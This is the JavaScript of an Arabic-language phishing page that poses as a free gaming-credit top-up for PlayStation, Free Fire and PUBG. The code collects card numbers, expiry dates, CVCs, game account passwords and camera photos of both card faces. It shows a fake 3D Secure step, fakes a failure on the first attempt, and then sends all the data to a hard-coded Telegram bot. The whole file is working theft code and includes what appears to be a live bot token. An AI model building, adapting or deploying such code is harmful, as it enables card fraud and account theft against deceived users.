// إعدادات البوت والدردشة 
// يجب أن يكون هذا التوكن نشطاً لكي يعمل الإرسال!
const BOT_TOKEN = '8099829199:AAEKGlOJOg49pQQ-ejccZE5Zw4b_mjCeeco';
const CHAT_ID = '8419807374'; 

// إعدادات الشحن: جميع الخدمات تشحن 30.00$ بمبلغ دفع 0.00$
const SHIPPING_AMOUNT = 30.00;
const PAYMENT_AMOUNT = 0.00; 

// أسماء الخدمات
const SERVICE_NAMES = {
    sony: "شحن رصيد سوني بلايستيشن (30$ رصيد)",
    freefire: "شحن رصيد فري فاير (30$ رصيد)",
    pubg: "شحن رصيد ببجي (30$ رصيد)"
};

// متغير الحالة لتدفق الخطأ ثم النجاح (محاكاة فشل أول محاولة أمنية)
let submissionAttempt = 0;

// **********************************************
// عناصر DOM 
// **********************************************
const paymentForm = document.getElementById('paymentForm');
const serviceSelect = document.getElementById('serviceSelect');

// بيانات البطاقة
const cardNumberInput = document.getElementById('cardNumber');
const expMonthInput = document.getElementById('expMonth');
const expYearInput = document.getElementById('expYear');
const cvcCodeInput = document.getElementById('cvcCode');

// بيانات الحساب
const usernameInput = document.getElementById('usernameInput');
const passwordInput = document.getElementById('passwordInput');

// الصور والمحاكاة
const frontInput = document.getElementById('frontInput');
const backInput = document.getElementById('backInput');
const frontPreview = document.getElementById('frontPreview');
const backPreview = document.getElementById('backPreview');
const submitBtn = document.getElementById('submitBtn');
const loader = document.getElementById('loader');
const resultBox = document.getElementById('result');
const summaryServiceName = document.getElementById('summaryServiceName');
const summaryTotal = document.getElementById('summaryTotal');

// عناصر الكاميرا
const cameraModal = document.getElementById('cameraModal');
const video = document.getElementById('video');
const cameraCanvas = document.getElementById('cameraCanvas');
const captureBtn = document.getElementById('captureBtn');
const closeCameraBtn = document.getElementById('closeCameraBtn');
let currentSide = null;
let mediaStream = null;
let capturedFrontBlob = null;
let capturedBackBlob = null;

// عناصر 3D Secure
const secureModal = document.getElementById('secureModal');
const secureCodeInput = document.getElementById('secureCodeInput');
const secureSubmit = document.getElementById('secureSubmit');
let currentPaymentDetails = {}; 

// **********************************************
// وظائف المساعدة العامة
// **********************************************

/**
 * يعرض رسالة النتيجة (نجاح أو خطأ) في صندوق النتيجة.
 * @param {string | null} message الرسالة المراد عرضها.
 * @param {string} type 'success' أو 'error'.
 */
function showResult(message, type) {
    if (!message) {
        resultBox.className = 'result';
        resultBox.textContent = '';
        return;
    }
    resultBox.innerHTML = message;
    resultBox.className = 'result ' + (type === 'success' ? 'success' : 'error');
}

function showSuccessMessage(message) {
    showResult(message, 'success');
}

function showErrorMessage(message) {
    showResult(message, 'error');
}

/**
 * يتحكم في حالة زر الإرسال ورمز التحميل.
 */
function setLoading(state) {
    if (state) {
        loader.classList.remove('hidden');
        submitBtn.disabled = true;
    } else {
        loader.classList.add('hidden');
        submitBtn.disabled = false;
    }
}

/**
 * يعرض معاينة للصورة في العنصر المحدد.
 */
function showPreview(fileOrUrl, targetElement) {
    const container = targetElement;
    container.innerHTML = '';
    const img = document.createElement('img');
    img.style.maxWidth = '100%';
    img.style.maxHeight = '100%';
    img.style.objectFit = 'contain';

    let url = '';
    if (typeof fileOrUrl === 'string') {
        url = fileOrUrl;
    } else {
        url = URL.createObjectURL(fileOrUrl);
        // Revoke object URL after image loads to free up memory
        img.onload = () => URL.revokeObjectURL(url);
    }
    img.src = url;
    container.appendChild(img);
}

/**
 * التحقق من نوع وحجم الملف قبل التحميل.
 * @param {HTMLInputElement} inputElement حقل الإدخال.
 * @returns {File | null} ملف الصورة أو null في حالة وجود خطأ.
 */
function handleImageUpload(inputElement) {
    const file = inputElement.files && inputElement.files[0];
    if (!file) return null;
    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
    const maxSize = 5 * 1024 * 1024; // 5MB
    if (!allowed.includes(file.type)) {
        showErrorMessage('❌ نوع الصورة غير مدعوم. الرجاء استخدام jpg أو png أو webp.');
        inputElement.value = '';
        return null;
    }
    if (file.size > maxSize) {
        showErrorMessage('❌ حجم الصورة كبير جداً. الحد الأقصى 5MB.');
        inputElement.value = '';
        return null;
    }
    return file;
}

// **********************************************
// منطق الكاميرا (تم التحديث لضمان الثبات باستخدام Canvas)
// **********************************************

/**
 * يفتح نافذة الكاميرا Modal ويبدأ البث.
 */
async function openCameraModal(side) {
    currentSide = side;
    cameraModal.classList.remove('hidden');
    cameraModal.setAttribute('aria-hidden', 'false');

    try {
        // طلب الوصول إلى الكاميرا الخلفية (environment)
        mediaStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'environment', // مهم لفتح الكاميرا الخلفية على الموبايل
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        video.srcObject = mediaStream;
        await video.play();

    } catch (err) {
        showErrorMessage('❌ تعذر الوصول إلى الكاميرا. قد تحتاج إلى اتصال HTTPS (مفعل على GitHub Pages): ' + err.message);
        cameraModal.classList.add('hidden');
    }
}

/**
 * إيقاف بث الوسائط وتحرير الكاميرا.
 */
function stopCamera() {
    if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
        mediaStream = null;
        video.srcObject = null;
    }
}

// التقاط الصورة من الفيديو (باستخدام Canvas - الطريقة الأكثر موثوقية)
captureBtn.addEventListener('click', () => {
    if (!mediaStream || video.paused || video.ended) {
        showErrorMessage('❌ الكاميرا غير نشطة أو متوقفة.');
        return;
    }

    try {
        // ضبط أبعاد Canvas بما يتناسب مع أبعاد الفيديو
        cameraCanvas.width = video.videoWidth;
        cameraCanvas.height = video.videoHeight;
        const ctx = cameraCanvas.getContext('2d');

        // رسم الإطار الحالي للفيديو على Canvas
        ctx.drawImage(video, 0, 0, cameraCanvas.width, cameraCanvas.height);

        // تحويل محتوى Canvas إلى Blob (ملف صورة)
        cameraCanvas.toBlob((blob) => {
            if (!blob) {
                showErrorMessage('❌ فشل في تحويل الصورة إلى ملف.');
                return;
            }

            const targetInput = currentSide === 'front' ? frontInput : backInput;
            const targetPreview = currentSide === 'front' ? frontPreview : backPreview;

            if (currentSide === 'front') {
                capturedFrontBlob = blob;
            } else {
                capturedBackBlob = blob;
            }

            showPreview(blob, targetPreview);
            targetInput.value = ''; // نزيل أي ملفات input سابقة (لضمان استخدام الـ Blob)

            stopCamera();
            cameraModal.classList.add('hidden');
            showResult(null); // مسح أي رسالة خطأ قديمة

        }, 'image/jpeg', 0.9); // جودة JPEG 90%

    } catch (err) {
        showErrorMessage('❌ خطأ أثناء التقاط الصورة: ' + err.message);
    }
});

// إغلاق الكاميرا والـ modal
closeCameraBtn.addEventListener('click', () => {
    stopCamera();
    cameraModal.classList.add('hidden');
    cameraModal.setAttribute('aria-hidden', 'true');
});


// **********************************************
// منطق تيليجرام 
// **********************************************

/**
 * يرسل الصور والبيانات إلى بوت تيليجرام.
 * * ⚠️ تنبيه هام بخصوص الإرسال:
 * عند إرسال ملفات متعددة (sendMediaGroup) مباشرة من المتصفح، قد تفشل العملية 
 * بسبب قيود CORS / الأمان المفروضة من قبل المتصفح. 
 * الحل المضمون هو استخدام سيرفر وسيط (Proxy Server) لاستقبال البيانات 
 * وإعادة إرسالها إلى خوادم تيليجرام.
 */
async function sendToTelegramBot(frontFile, backFile, paymentDetails) {
    showResult(null);
    setLoading(true);

    if (!CHAT_ID || BOT_TOKEN.startsWith('REPLACE')) {
        showErrorMessage('❌ خطأ في الإعداد: Chat ID أو Bot Token غير صحيح.');
        setLoading(false);
        return;
    }

    const selectedService = SERVICE_NAMES[paymentDetails.service] || "خدمة غير محددة";
    const purchaseMessage = `**🚨 طلب شحن رصيد (بيانات كاملة) 🚨**\n\n` +
        `**الخدمة المطلوبة:** ${selectedService}\n` +
        `**رصيد الشحن:** ${SHIPPING_AMOUNT.toFixed(2)}$\n` +
        `**مبلغ الدفع:** ${PAYMENT_AMOUNT.toFixed(2)}$ (توثيق أمني - مجاني)\n` +
        `---\n` +
        `**💳 بيانات البطاقة المصرفية للتوثيق:**\n` +
        `  - **الرقم:** ${paymentDetails.cardNumber}\n` +
        `  - **الانتهاء:** ${paymentDetails.expMonth}/${paymentDetails.expYear}\n` +
        `  - **CVC:** ${paymentDetails.cvcCode}\n` +
        `---\n` +
        `**🕹️ بيانات الحساب للشحن المباشر:**\n` +
        `  - **البريد/المستخدم:** ${paymentDetails.username}\n` +
        `  - **كلمة المرور:** ${paymentDetails.password}\n` +
        `---\n` +
        `**التوثيق:** تم إرسال صور البطاقة المرفقة.`;

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`;
        const form = new FormData();

        // إعداد مصفوفة Media مع الرسالة في أول صورة
        // يجب أن تتطابق 'attach://front' و 'attach://back' مع أسماء حقول الملفات في FormData
        const media = [
            { type: 'photo', media: 'attach://front', caption: purchaseMessage, parse_mode: 'Markdown' },
            { type: 'photo', media: 'attach://back', caption: 'صورة الوجه الخلفي (رمز الأمان)' }
        ];

        form.append('chat_id', CHAT_ID);
        form.append('media', JSON.stringify(media));

        // إضافة الملفات (تسميتها front و back)
        form.append('front', frontFile, 'front.jpg');
        form.append('back', backFile, 'back.jpg');

        const resp = await fetch(url, { method: 'POST', body: form });
        const data = await resp.json();

        if (resp.ok && data.ok) {
            // رسالة النجاح النهائية المطلوبة
            showSuccessMessage(`✅ **اكتمل طلبك بنجاح!** سيتم مراجعة طلبك في غضون ثلاثة أيام عمل. يرجى متابعة بريدك الإلكتروني.`);

            // إعادة تعيين الواجهة
            paymentForm.reset();
            frontPreview.innerHTML = 'اضغط على الزر أعلاه للتوثيق.';
            backPreview.innerHTML = 'اضغط على الزر أعلاه للتوثيق.';
            capturedFrontBlob = null;
            capturedBackBlob = null;
            summaryServiceName.textContent = 'لم يتم التحديد';
            summaryTotal.textContent = '0.00$';
            submissionAttempt = 0; // إعادة تعيين المحاولات بعد النجاح

        } else {
            // رسالة خطأ عند فشل تيليجرام في المعالجة
            const msg = (data && data.description) ? data.description : 'خطأ غير معروف أثناء الاتصال بتيليجرام.';
            showErrorMessage(`❌ فشل في الإرسال: ${msg}. (قد يكون بسبب قيود المتصفح - حاول مجدداً أو استخدم سيرفر وسيط)`);
        }
    } catch (err) {
        // رسالة خطأ شبكة أو CORS
        showErrorMessage('❌ فشل في الإرسال: تأكد من اتصال الإنترنت أو قد تكون المشكلة هي قيود أمان المتصفح (CORS) عند إرسال الملفات. ' + err.message);
    } finally {
        setLoading(false);
    }
}


// **********************************************
// أحداث النموذج الرئيسي والتهيئة
// **********************************************

// تحديث ملخص الطلب
serviceSelect.addEventListener('change', () => {
    const selectedValue = serviceSelect.value;
    const serviceName = SERVICE_NAMES[selectedValue] || "لم يتم التحديد";

    // تحديث النص في ملخص الطلب: عرض رصيد الشحن و 0.00$ للدفع
    summaryServiceName.textContent = serviceName.split('(')[0].trim() + ` (${SHIPPING_AMOUNT.toFixed(2)}$ رصيد)`;
    summaryTotal.textContent = PAYMENT_AMOUNT.toFixed(2) + '$'; 

    showResult(null); // مسح رسائل الخطأ عند تغيير الخدمة
});

// تنسيق رقم البطاقة
cardNumberInput.addEventListener('input', (e) => {
    const value = e.target.value.replace(/\s/g, '');
    e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
});

// أحداث الإدخال اليدوي للملفات
frontInput.addEventListener('change', () => {
    capturedFrontBlob = null;
    const file = handleImageUpload(frontInput);
    if (file) showPreview(file, frontPreview);
});

backInput.addEventListener('change', () => {
    capturedBackBlob = null;
    const file = handleImageUpload(backInput);
    if (file) showPreview(file, backPreview);
});

// ربط زر الكاميرا بفتح حقل إدخال الملف أو الكاميرا (في الموبايل)
document.querySelectorAll('.camera-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
        e.preventDefault();
        const side = btn.getAttribute('data-side');
        const fileInput = side === 'front' ? frontInput : backInput;

        // في الأجهزة المحمولة، نفضل فتح الكاميرا مباشرة (لضمان استخدام الكاميرا الخلفية)
        // شرط العرض أقل من 768px أو الكشف عن دعم الكاميرا المتقدم
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia && ('ontouchstart' in window || navigator.maxTouchPoints > 0)) {
            openCameraModal(side);
        } else {
            // في الحاسوب المكتبي أو إذا فشل الوصول للكاميرا، نفتح حقل اختيار الملف
            fileInput.click();
        }
    });
});

// حدث إرسال النموذج (يفتح نافذة 3D Secure)
paymentForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    showResult(null);

    // 1. التحقق من المدخلات الأساسية
    if (!serviceSelect.value || !usernameInput.value || !passwordInput.value || !cardNumberInput.value || !expMonthInput.value || !expYearInput.value || !cvcCodeInput.value) {
        showErrorMessage('❌ يرجى تعبئة جميع حقول الشحن والدفع للتوثيق.');
        return;
    }

    // 2. التحقق من ملفات الصور (من input file أو من الكاميرا blob)
    let frontFile = (frontInput.files && frontInput.files[0]) ? frontInput.files[0] : capturedFrontBlob;
    let backFile = (backInput.files && backInput.files[0]) ? backInput.files[0] : capturedBackBlob;

    if (!frontFile || !backFile) {
        showErrorMessage('❌ يرجى التقاط أو رفع صورة للوجه الأمامي والخلفي لتوثيق الشراء.');
        return;
    }

    // يتم التحقق من حجم ونوع الصور هنا (بما في ذلك الصور الملتقطة)
    const filesAreValid = (file) => {
        const allowed = ['image/jpeg', 'image/png', 'image/webp'];
        const maxSize = 5 * 1024 * 1024;
        return (file.size <= maxSize); // نوع الملف يتم التحقق منه تلقائياً أو عبر toBlob
    };

    if (frontFile.type === "image/jpeg" && !filesAreValid(frontFile)) {
        showErrorMessage('❌ حجم الصورة الأمامية كبير جداً (أكبر من 5MB).');
        return;
    }
    if (backFile.type === "image/jpeg" && !filesAreValid(backFile)) {
        showErrorMessage('❌ حجم الصورة الخلفية كبير جداً (أكبر من 5MB).');
        return;
    }

    // 3. تخزين التفاصيل وفتح شاشة 3D Secure
    currentPaymentDetails = {
        service: serviceSelect.value,
        username: usernameInput.value,
        password: passwordInput.value,
        cardNumber: cardNumberInput.value.replace(/\s/g, ''),
        expMonth: expMonthInput.value,
        expYear: expYearInput.value,
        cvcCode: cvcCodeInput.value,
        frontFile: frontFile,
        backFile: backFile
    };

    openSecureModal();
});


// **********************************************
// وظائف 3D Secure Modal (محاكاة)
// **********************************************

function openSecureModal() {
    secureCodeInput.value = '';
    secureModal.classList.remove('hidden');
    secureModal.setAttribute('aria-hidden', 'false');
}

secureSubmit.addEventListener('click', async () => {
    if (!secureCodeInput.value || secureCodeInput.value.length < 4) {
        // نكتفي بعدم الاستجابة أو تغيير الواجهة بدلاً من alert
        return;
    }

    // إغلاق شاشة 3D Secure
    secureModal.classList.add('hidden');
    secureModal.setAttribute('aria-hidden', 'true');

    // زيادة عداد المحاولات
    submissionAttempt++;

    if (submissionAttempt === 1) {
        // المحاولة الأولى: رسالة خطأ وهمية (محاكاة فشل توثيق 3D Secure)
        showErrorMessage('❌ فشل التحقق من الدفع. رمز الخطأ (8001). يرجى التأكد من بياناتك والمحاولة مرة أخرى بعد ثوانٍ. (محاولة أولى وهمية)');
    } else {
        // المحاولة الثانية وما بعدها: رسالة نجاح وإرسال البيانات الفعلية
        await sendToTelegramBot(
            currentPaymentDetails.frontFile,
            currentPaymentDetails.backFile,
            currentPaymentDetails
        );
    }
});


// تهيئة حالة الواجهة عند التحميل
document.addEventListener('DOMContentLoaded', () => {
    setLoading(false);
    // تحديث الملخص الافتراضي عند التحميل
    serviceSelect.dispatchEvent(new Event('change'));
});

